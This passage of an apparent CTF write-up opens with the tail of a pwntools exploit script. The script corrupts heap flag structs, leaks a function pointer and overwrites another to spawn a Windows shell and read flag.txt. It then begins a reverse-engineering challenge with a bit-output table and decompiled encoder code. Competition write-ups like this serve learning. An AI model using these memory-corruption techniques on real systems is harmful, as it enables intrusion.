</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;save</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yolo&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;id=&#34;</span>)
</span></span><span style=display:flex><span>    id2 <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># create flag 3</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;save</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yolo&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;id=&#34;</span>)
</span></span><span style=display:flex><span>    id3 <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># delete flag 1, will set size to something big and corrupt content</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;delete</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(id1<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># detect if flag 2 comes right after flag 1, by gradually checking if</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># submit gives the correct output for flag 2</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># (flag struct has to begin with 0xffffffffffffffff,</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#  or submit will not print contents)</span>
</span></span><span style=display:flex><span>    found <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> times <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;edit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(id1<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline((<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>)<span style=color:#f92672>*</span>times)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;submit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>sendline(id2<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yolo&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> msg:
</span></span><span style=display:flex><span>            print(msg)
</span></span><span style=display:flex><span>            print(times)
</span></span><span style=display:flex><span>            saved_times <span style=color:#f92672>=</span> times
</span></span><span style=display:flex><span>            found <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> found:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;try again :(&#34;</span>)
</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#exit()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># manually set from leak output, will maybe change if server restarts</span>
</span></span><span style=display:flex><span>image_base <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7ff62cd80000</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>submit <span style=color:#f92672>=</span> image_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x25040</span>
</span></span><span style=display:flex><span>edit <span style=color:#f92672>=</span> image_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x25090</span>
</span></span><span style=display:flex><span>oldfunc <span style=color:#f92672>=</span> image_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x25110</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;submit:  </span><span style=color:#e6db74>{</span>hex(submit)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;edit:    </span><span style=color:#e6db74>{</span>hex(edit)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;oldfunc: </span><span style=color:#e6db74>{</span>hex(oldfunc)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> leak:
</span></span><span style=display:flex><span>    <span style=color:#75715e># overwrite flag 2 submit pointer</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;edit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(id1<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline((<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>)<span style=color:#f92672>*</span>saved_times <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xff</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0x00</span>) <span style=color:#f92672>+</span> p64(oldfunc))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;save</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;yo&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;id=&#34;</span>)
</span></span><span style=display:flex><span>    id4 <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvline()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># trigger function call</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;submit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(id2<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># windows lol</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;C:\&gt;&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;type flag.txt&#34;</span>)
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>)<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>interactive()
</span></span><span style=display:flex><span>    exit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># overwrite flag 2 size field</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;edit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(id1<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline((<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>)<span style=color:#f92672>*</span>saved_times <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xff</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x01</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># leak flag 3 submit pointer</span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;-&gt; &#34;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;submit</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(id2<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xff</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>4</span>))
</span></span><span style=display:flex><span>submit <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>8</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;submit:&#34;</span>, hex(submit))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>oldfunc <span style=color:#f92672>=</span> submit <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x140025040</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x140025110</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;base:&#34;</span>, hex(oldfunc <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x25110</span>))
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;oldfunc:&#34;</span>, hex(oldfunc))
</span></span></code></pre></div><h1 id=rev>rev<a hidden class=anchor aria-hidden=true href=#rev>#</a></h1><h2 id=circuitry-magic>Circuitry magic<a hidden class=anchor aria-hidden=true href=#circuitry-magic>#</a></h2><blockquote><p>VHDL is for noobs, I implement all my tests in C, it is faster, easier, and more resistant to attacks!</p><p>Note: flag needs to be wrapped in ptm{}, it is all printable ascii and it makes sense in English.</p><p>Author: @Alberto247</p></blockquote><p>We are given a binary <code>encoder</code> and a text file <code>output.txt</code>. <code>output.txt</code> contains a list in json format:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>[{<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>1</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>2</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>3</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>4</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>5</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>6</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>7</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>8</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>9</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>10</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>11</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>12</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>13</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>14</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>15</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>16</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>17</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>18</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>19</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>20</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>21</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>22</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>23</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>24</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>25</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>26</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>27</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>28</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>29</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>30</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>31</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>32</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>33</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>34</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>35</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>36</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>37</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>38</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>39</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>40</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>41</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>42</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>43</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>44</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>45</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>46</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>47</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>48</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>49</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>50</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>51</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>52</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>53</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>54</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>55</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>56</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>1</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>57</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>58</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>59</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>60</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>61</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>62</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}, {<span style=color:#f92672>&#34;input&#34;</span>: <span style=color:#ae81ff>63</span>, <span style=color:#f92672>&#34;output&#34;</span>: <span style=color:#ae81ff>0</span>}]
</span></span></code></pre></div><p>This seems to be output bits for each input number from 0 to 63, probably given by the encoder program.</p><p>Looking at the binary in a disassembler/decompiler we see that indeed it takes a number between 0 and 63 as input, does some calculations, and outputs a 0 or 1. An array called <code>flag</code> is used in these calculations, so the idea is probably to find what values we have to put in the flag array to give the output in <code>output.txt</code>.</p><p>The relevant code from the main function looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#66d9ef>int</span> input_int;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint8_t</span> output_bit;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    scanf(<span style=color:#e6db74>&#34;%d&#34;</span>, <span style=color:#f92672>&amp;</span>input_int);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (input_int <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> input_int <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0x3f</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>6</span>; <span style=color:#f92672>++</span>i) {
</span></span><span style=display:flex><span>            bits[<span style=color:#ae81ff>5</span> <span style=color:#f92672>-</span> i] <span style=color:#f92672>=</span> input_int <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>            input_int <span style=color:#f92672>&gt;&gt;=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        first_step(bits, values);
</span></span><span style=display:flex><span>        second_step(values);
</span></span><span style=display:flex><span>        third_step(values, <span style=color:#f92672>&amp;</span>output_bit);
</span></span><span style=display:flex><span>        printf(<span style=color:#e6db74>&#34;%d&#34;</span>, output_bit);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>We see there are three parts. The <code>first_step</code> function does the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>first_step</span>(<span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>bits, <span style=color:#66d9ef>uint8_t</span> <span style=color:#f92672>*</span>out)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0x40</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        out_val <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; j<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>2</span>; j<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint8_t</span> term <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; k<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>6</span>; k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>                term <span style=color:#f92672>&amp;=</span> first_step_array[i<span style=color:#f92672>*</span><span style=color:#ae81ff>0xc</span> <span style=color:#f92672>+</span> j<span style=color:#f92672>*</span><span style=color:#ae81ff>6</span> <span style=color:#f92672>+</span> k](bits[k]);
</span></span><span style=display:flex><span>            out_val <span style=color:#f92672>|=</span> term;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        out[i] <span style=color:#f92672>=</span> out_val;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
